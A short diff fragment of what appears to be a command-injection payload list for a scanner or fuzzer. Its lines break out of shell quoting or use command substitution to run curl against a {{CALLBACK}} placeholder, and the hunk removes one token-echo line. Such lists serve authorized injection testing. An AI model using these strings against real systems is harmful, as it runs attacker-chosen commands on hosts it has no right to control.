@@ -12,4 +12,3 @@ $(curl {{CALLBACK}})
 "; curl {{CALLBACK}}; echo "
 '; curl {{CALLBACK}}; echo '
 \n curl {{CALLBACK}}\n
-; echo {{TOKEN}}
